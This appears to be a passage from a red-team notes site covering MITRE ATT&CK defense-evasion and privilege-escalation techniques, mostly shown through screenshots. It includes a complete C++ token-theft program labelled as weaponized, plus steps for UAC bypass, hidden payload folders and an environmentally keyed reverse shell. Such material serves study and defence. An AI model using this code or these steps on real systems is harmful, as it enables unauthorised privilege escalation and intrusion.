![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhlRkHzsAnfsJcE_55%2F-MRhmE8gI9JCUvwSwx02%2Fimage.png?alt=media&token=3d4397a7-2372-4717-a491-3d41b26a79a9)

Here we will proceed with creating a hidden file. A .txt file is created with hidden ADS and to add content in the file we can use the command:

** echo Hello World, Again!! > Hello-World.txt:hidden**

To display contents I used the previous commands.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhlRkHzsAnfsJcE_55%2F-MRhmF6QeNW_ix3i_Rbj%2Fimage.png?alt=media&token=76a091bf-dc66-4528-b13b-d000b77951a5)

But to no luck, here you see that the file is not recognized, therefore, to see hidden content you can use the 

**more**

  command.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhlRkHzsAnfsJcE_55%2F-MRhmG2acvjGQNDGRa8S%2Fimage.png?alt=media&token=5209a6ea-8adc-4332-8b35-7e62d227416c)

And to view the DataStream we check it again with the 

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhlRkHzsAnfsJcE_55%2F-MRhmGvZxt4hqF0fDpnB%2Fimage.png?alt=media&token=3eed4516-844e-45e1-8a08-13382b88b519)

You can also open this file with notepad and the contents will be displayed as well. For more information and even with the use of PowerShell here are some references.

Defense Evasion: Alternate Data Streams - Hacking Articles

Hacking Articles

Using Alternate Data Streams to Persist on a Compromised Machine

enigma0x3

Attack Step 3: Persistence with NTFS Extended Attributes - File System Attacks

Stealthbits Technologies

​

### hidden-window

Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.

On Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden.

Similarly, on macOS the configurations for how applications run are listed in property list (plist) files. One the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.

Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.

**Example:**

Just for this demonstration purposes I will use PowerShell as it is very easy to abuse this features and have it execute a payload with a Hidden Window

**Demo:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhlG4SGE2wDsWmqNrl%2F-MRhlP8Sb-lek0eC2O4D%2FHidden%20Windows.gif?alt=media&token=b5eea79b-595b-49f4-abcc-59952618526e)

### hidden-files-and-directories

Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a "hidden" file. These files don't show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls -a for Linux and macOS).

On Linux and Mac, users can mark specific files as hidden simply by putting a "." as the first character in the file or folder name. Files and folders that start with a period, '.' are by default hidden from being viewed in the Finder application and standard command-line utilities like "ls". Users must specifically change settings to have these files viewable.

Files on macOS can also be marked with the UF_HIDDEN FLAG which prevents them from being seen in Finder.app but still allows them to be seen in Terminal.app. On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn't clutter up the user's workspace. For example, SSH utilities create a .ssh folder that's hidden and contains the user's known hosts and keys.

Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.

**Example:**

 here we will hide some folders to avoid detection, since these folders by default are not commonly viewable in the GUI unless activated, or not even in the command-line or PowerShell unless intended.

I will hide a folder named Payloads in this example which has my payload to connect back to my attacking machine.

Here we can see it is perfectly viewable.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhl3nMqW-q06QQdhvi%2F-MRhlAtJFip7Z0NcuVJg%2Fimage.png?alt=media&token=df03bad1-7694-45df-9a62-4efb76df6f80)

Now let's hide it.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhl3nMqW-q06QQdhvi%2F-MRhlBvS1jyD0u-kpRie%2Fimage.png?alt=media&token=d3885e18-ec78-427c-81f6-5a099e7f7acb)

The great thing about this is that as long as you have the correct permissions on a folder then you can hide it, same goes for a file.

If I search it with cmd it won't show as well.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhl3nMqW-q06QQdhvi%2F-MRhlD3z37Ar4BnNQaNA%2Fimage.png?alt=media&token=659b8a4f-b4b1-4b4e-ae09-71fbf73f0c76)

Unless I intend to search it with the "/a" flag

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhl3nMqW-q06QQdhvi%2F-MRhlE7X_G3xeuYtbPFr%2Fimage.png?alt=media&token=1a063aad-f8c1-4f7d-aa76-1515e48e87ba)

## untitled-4

Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Modifications may include changing specific access rights, which may require ownership of a file or directory and/or elevated permissions depending on the file or directory's existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be required a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon initialization Scripts, .bash_profile and .bashrc, or tainting/hijacking other instrumental binary/configuration files vie Hijack Execution Flow.

### windows-file-and-directory-permissions-modification

Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.

Adversaries can interact with the DACLs using built-in Windows commands, such as icacls, cacls, takeown, and attrib, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.

**Example:**

Some great examples on Permissions modifications we encounter in some assessments. Let's check the following example.

We have a "Permissions" folder that our current user dwinchester has no permissions in.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhkb1jxuM02Kx34EnM%2F-MRhkc5rCizaBtIsqMuk%2Fimage.png?alt=media&token=91684ffb-d716-416c-9cdf-875ed615f780)

No permissions to view as well.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhkb1jxuM02Kx34EnM%2F-MRhkcy3RBeIMUsMUXDQ%2Fimage.png?alt=media&token=c1c1c2c8-73be-4ade-8221-460089fe428f)

So here we can use these tools 

** icacls, cacls, takeown and attrib**

  just to not exaggerate on the tools I will demonstrate how an adversary can gain permission once someone has elevated privileges or is the correct user.

I have DENY permission even with a Local Administrator Account so I will take some steps to change the user permissions.

**Takeown**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhkb1jxuM02Kx34EnM%2F-MRhkeHXA1D1OoGjfC67%2Fimage.png?alt=media&token=b48e4a24-2f30-4345-8919-8ad7a9e9bfe3)

**Icacls**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhkb1jxuM02Kx34EnM%2F-MRhkf6mEJ0kcOwKHFiR%2Fimage.png?alt=media&token=8836cca2-e7cb-4451-97a5-fd2ab11ee64d)

Then we finally have managed to give ourselves and user the permissions necessary to  modify the folder.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhkb1jxuM02Kx34EnM%2F-MRhkgK2qchfj5MDCqEw%2Fimage.png?alt=media&token=b6d2f134-12d5-4557-b208-d6b2323c42e7)

A simple demonstration on how we can modify folder permissions as mentioned previously we can use this technique for various other techniques. Persistence, Defense Evasion, hijack Execution Flow and others.

## untitled-3

Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against and intended target and reduces collateral damage from an adversary campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/internal IP addresses.

Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value only continuing with execution if there is such a match.

### environmental-keyring

Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keyring uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keyring is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.

Values can be derived from target specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keyring can make sandbox detection, anti-virus detection, crowdsourcing of information, reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques and procedures (TTPs).

Similar to Obfuscated Files or information, adversaries may use environmental keyring to help protect their TTPs evade detection. Environmental keyring may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload that adversary con avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.

Like Execution Guardrails, environmental keyring can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While used of Virtualization/Sandbox Evasion may involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.

**Example:**

This is the most simple and basic example I managed to write since my programming or cryptographic skills barely leave the floor.

First I will create a payload and edit my configuration to use an environmental variable (DESKTOP-ALPHA) which would be the computer name of my target and it's Domain name DC(DominionCyber) to encrypt a payload using these 2 as keys. Once these 2 are found in the system the payload will decrypt and execute.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhjWrRPZBRayJiQ5fY%2F-MRhk5r8ZPdwkOvktT-Z%2Fimage.png?alt=media&token=bf3d70f1-9da0-48e5-a2b9-0f3d5f904514)

Will compile the payload and configuration using the Ebowla Tool.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhjWrRPZBRayJiQ5fY%2F-MRhk6oC3eJvJGBRIYac%2Fimage.png?alt=media&token=03f04390-247c-4edb-8f6c-1e8d22ac34e7)

Now I will follow the instructions to compile my payload as this tool contains 3 methods PowerShell, Python and GO.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhjWrRPZBRayJiQ5fY%2F-MRhk8LtODu2DncFOfXv%2Fimage.png?alt=media&token=591fefe2-329d-42dc-9c2f-a69eeb49270e)

Now for execution and see what it does for the payload to work. We can see in the output that the payload has a KEY and will find this key strings on our target environment if found it will use these to decrypt and execute with our reverse shell.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhjWrRPZBRayJiQ5fY%2F-MRhk99l6TA8RSrOZzIv%2Fimage.png?alt=media&token=e33a8484-83f2-4e67-8589-f6aebdc29173)

Found successfully on our attacking machine a successful shell connected back to us. This was successful since the variables in the target machine match our keys.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhjWrRPZBRayJiQ5fY%2F-MRhkA1N2xWgDm42Xpi4%2Fimage.png?alt=media&token=732987a3-9dd2-402d-8e33-df62aca9ed34)

And you can see here that the hashes match for a successful decryption as well in here:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhjWrRPZBRayJiQ5fY%2F-MRhkB0bMD1boaNaX2w7%2Fimage.png?alt=media&token=e99cf75a-ea89-4d25-9e72-2ca432076f9d)

Shell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhjWrRPZBRayJiQ5fY%2F-MRhkBvO2NZQoIHyq0nl%2Fimage.png?alt=media&token=0a3d6d1d-3115-4028-8453-c9db1672e8ab)

Here is a great resource and understanding on how it would work properly.

GitHub - ohoph/3bowla: Python3 Ebowla... 3Bowla

GitHub

## untitled-2

Adversaries may abuse BITS jobs persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updates, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.

Adversaries may abuse BITS to download, execute and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).

BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.

In the following example I will create a simple bitsadmin job with user Privileges this will start a calc process to execute.

First we use the /create option to create our job

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHQy4iHJgIxe6ZNLr%2Fimage.png?alt=media&token=19bfe3b8-d5f6-484e-a1d5-1a8eb96eec42)

We will attach a file as well:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHPCtA-UJsmpNG3p8%2Fimage.png?alt=media&token=66c32a6e-a9e5-40cd-a694-452be91fb020)

A file needs to be created for the job to function properly.

Then we will use the SetNotifyCmdLine Parameter this will set a program to execute for notification, and can optionally take parameters. These options can also be NULL.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHQ6sMtPfOwuFHTyv%2Fimage.png?alt=media&token=20827727-b4a0-4f52-9c10-8fcfbe022ba0)

Too much of an extra step but we will call cmd to start a calc process on our job

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHRuDy4uuyAthh-aD%2Fimage.png?alt=media&token=25f48efe-3aed-4cc9-99fb-49aabf7ed5f8)

Demo:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhI5u9Sp5UxfhkntAF%2FBitsAdmin-Sample.gif?alt=media&token=74460b51-06fd-4fe3-ac9e-6270d5d223f3)

References:

LOLBAS

## untitled-1

Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. Administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.

Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.

### parent-pid-spoofing

Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.

Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within malicious Office document or any code that can perform Native API.

Explicitly assigning PPID mal also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (ie. Administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.

**Example:**

This technique was introduced by Didier Stevesn. A proof of Concept was was written in C++ it was released to the public (SelectMyParent) that could allow the user to select the parent process by specifying the PID (process identifier). The "CreateProcess" function was used in conjunction with the "STARTUPINFOEX" and "LPROC_Thread_ATTRIBUTE_LIST".

Here is a sample of the Demo working

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhaD0K2qrRdc4_ZPcN%2F-MRhaJnQnu4Ki56x-Pep%2Fimage.png?alt=media&token=4dc3b538-fa9c-4069-b4b5-985000a77778)

As you can see the payload in now a child process of Firefox with the PID 2696.

We also have another tool from 

**Julian Horoszkiewics**

 which is based of the work of Didier and we can verify the same goal was reached when spoofing our Parent Process. This is achieved through the CreateProcess API

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhaD0K2qrRdc4_ZPcN%2F-MRhaKSEkbJNgN_OyigK%2Fimage.png?alt=media&token=b03d1dc9-2c36-4a37-93f9-e1979cd38182)

### make-and-impersonate-token

Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.

​

[Abusing S4U2Self: Another Sneaky Active Directory Persistence - AlsidIntroduction As part as the recent publication of Elad Shamir’s work on Kerberos delegation (“Wagging the Dog – Abusing Resource-Based Constrained Delegation to Attack Active Directory”), Alsid is publishing a series of blogposts deepening the uncovered new attack vectors and shedding a light on pragmatic solution for Blue Teams trying to measure the impact of...www.alsid.com](https://www.alsid.com/crb_article/abusing-s4u2self/)

### create-process-with-token

Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with DuplicateToken(Ex) and use it with CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.

**Example:**

**In simple terms, this is when a token of an already exisiting accoes token present in one of the running processes on the victim host, is retrieved, duplicated and then used for creating a new process**

Step

Win32 API

Open a process with access token you want to steal

OpenProcess

Get a handle to the access token of that process

OpenProcesToken

Make a duplicate of the access token present in that process

DuplicateTokenEx

Create a new process with the newly aquired access token

CreateProcessWithTokenW

I will weaponize this technique using the following code:

**Code:**

1

#include "stdafx.h"#include #include int main(int argc, char * argv[]) {char a;HANDLE processHandle;HANDLE tokenHandle = NULL;HANDLE duplicateTokenHandle = NULL;STARTUPINFO startupInfo;PROCESS_INFORMATION processInformation;DWORD PID_TO_IMPERSONATE = 3060;wchar_t cmdline[] = L"C:\\shell.cmd";ZeroMemory(&startupInfo, sizeof(STARTUPINFO));ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));startupInfo.cb = sizeof(STARTUPINFO);        processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);                        CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);std::cin >> a;    return 0;}

Copied!

My target here is notepad as it is running with Administrator privileges and for the sake of demonstration purposes. Compiling the previous code with use the proper API calls to grab the token, duplicate it and open cmd prompt with Administrator privileges.

As you can see when running the compiled binary using PowerShell as the parent process of the ConsoleApplication running as the user but cmd process running as Administrator

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_TkEPzKdYoMfBZXx%2F-MRh_hwpynuOyH1FRnYe%2Fimage.png?alt=media&token=8f5df352-909a-4649-b7ea-6cf2f3889b45)

Create a Process with Token

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_TkEPzKdYoMfBZXx%2F-MRh_kBwacowMWvBavJ2%2Fimage.png?alt=media&token=3ad089e0-a223-4a93-bca6-e7692ada573a)

References:

### token-impersonation-theft

Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token.

An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.

**Example:**

PrintSpoofer.exe

Impersonate Privileges with a Named Pipe for this to work the tool tricks NT AUTHORITY\SYSTEM account into connecting and authenticating to an RPC server they control by leveraging some peculiarities of the Istorage COM interface. This exploit is well known by using the RottenPotato or RogueWinRm Exploits.

During the authentication process, all the messages are relayed between the client - the SYSTEM account here - and a local NTLM negotiator. This negotiator is just a combination of several Windows API calls such as AcquireCredentialsHanlde() and AcceptSecurityContext() which interact with the lsass procces through ALPC. In the end if all goes well, you get SYSTEM.

Here I am as the current user with the privileges needed.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_5-1ameV03pC-f_z%2F-MRh_Bmz_oDJm7rcvtrm%2Fimage.png?alt=media&token=75a8c17f-d264-41e2-ac6d-7320ef22c5c0)

Then I move to using the PrintSpoofer exploit which will abuse the Print System Remote Protocol this is used with a tooled called SpoolSample the exploit is based on a single RPC call to a function exposed by the Print Spooler service.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_5-1ameV03pC-f_z%2F-MRh_C_2hbz-F0-tDvbU%2Fimage.png?alt=media&token=25262546-2819-4495-84e8-dfdf72a42295)

According to documentation, this function create a remote change notification object that monitors changes to printer objects and 

**send change notifications to a print client**

 using either RpcRouterReplyPinter or RpcRouterReplyPrinterEx.

But how are these notifications sent? "via ROC… 

**over a named pipe".**

 The thing here is that it communicates with a named pipe called "\pipe\spools" . 

**It4man**

 implements a trick on his PrintSpoofer tool to trick and control the path used by a server. With some slight adjustments we canc reate a server path and trick the RPC to communicate into a SYSTEM controlled pipe onto our controlled one and receive SYSTEM access.

**Path Manipulation**

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_5-1ameV03pC-f_z%2F-MRh_LqsbPonDrC5TIip%2Fimage.png?alt=media&token=39106da9-2757-4c78-84df-54452cca8a6b)

As a prerequisite, 

**the only required privilege**

 is SeImpersonatePrivilege

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRh_5-1ameV03pC-f_z%2F-MRh_LDRHwqw_Hq2WM4W%2Fimage.png?alt=media&token=c79a9fdc-ae10-4f0f-a3eb-e8bbe52a4b8e)

Referenes:

​

## untitled

Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.

### bypass-user-account-control

Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact of the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional methods are regularly discovered and some used in the wild, such as:

· Eventvwr.exe can auto-elevate and execute a specified binary or script.

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.

**Examples**

:

In the first example, why not DisableUAC for its entirety??. We can do this by changing the EnableUA Key and we won't receive prompts no more on anything that is executed with high privileges!!.

Warning: This will need Administrator Permissions. And this will prompt the user a warning that UAC will need a restart to turn it off

Once we apply the key we can simply restart the target machine and have it disabled

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhZoZ6wGW2icK2qWfC%2F-MRhZu0Czak_YWL2jQtV%2Fimage.png?alt=media&token=876c32e2-27e3-4d03-981d-1b06354fa92d)

And that's it anytime we execute a payload or anything that enables a prompt it won't use UAC it will simply execute. But this is a very noticeable feature, just demonstrating as it is very simple to use.

Let's try another attack

Fodhelper the great about this one is that we can work with User privileges and have it execute our payload. In this example I will have it execute cmd with Administrator Privileges

Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10. Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhZoZ6wGW2icK2qWfC%2F-MRhZutA-QjxT1j1HW7v%2Fimage.png?alt=media&token=e0736176-2868-420a-b2c8-a8d816ef1d09)

## de-obfuscate-decode-files-or-information

Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

One such example is use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.

Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.

**Example:**

Here is a simple obfuscation trick from PowerShell that executes base64 encoded commands.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhhMT0YCFeVnIElxf2%2F-MRhhfiQUP6Wz-5kbEEa%2Fimage.png?alt=media&token=d2553342-73a7-4a5a-b291-a081e7755d33)

What is that base64 encoded string, Get-Process.

**For some reason when I encoded using the web or linux the string is always incorrect so I used PowerShells method for encoding strings to base64**

**Update: Thanks to a user **

init5 

**it was pointed out that we need to make sure to be using UTF-16LE for hen we are encoding on Linux to have work on Windows**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhhMT0YCFeVnIElxf2%2F-MRhhh4MSs7XeftugjC0%2Fimage.png?alt=media&token=f9e5373e-e3fb-471f-bf7f-e0b982882b77)

And this decodes correctly on Linux.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS08dMu2_PecnC84U_S%2F-MS092oGhJiru6FSa_yb%2Fimage.png?alt=media&token=ba58b06a-a05d-4177-b758-914197edce9f)

# credential-access

The adversary is trying to steal account names and passwords.

Credential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credential include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.

## t1552-unsecured-credentials

